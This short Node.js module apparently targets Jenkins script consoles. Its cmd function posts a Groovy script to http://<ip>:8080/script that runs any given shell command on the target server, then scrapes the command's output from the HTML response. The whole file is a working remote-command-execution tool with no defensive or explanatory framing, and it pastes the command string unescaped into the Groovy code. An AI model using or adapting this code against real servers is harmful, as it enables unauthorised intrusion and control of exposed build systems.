var request = require('request'),
	cheerio = require('cheerio');

exports.cmd = function(ip, command){
request.post({url:'http://'+ip+':8080/script', form: {"Submit":"Run","script":"def sout = new StringBuffer(), serr = new StringBuffer()\r\ndef proc = '"+command+"'.execute()\r\nproc.consumeProcessOutput(sout, serr)\r\nproc.waitForOrKill(1000)\r\nprintln \"out&gt; $sout err&gt; $serr\""}}, 
	function(err,httpResponse,body){
	    $ = cheerio.load(body);
	 	result = $('#main-panel > h2').next('pre').text();
	 	if (result.length === 0){
	 		result = $('#main-panel-content > pre:nth-child(12)').text();
	 	}
	 	result = result.replace("out&gt;", "").trim();
	 	result = result.replace("err&gt;", "").trim();
	 	console.log(result);

	})

}
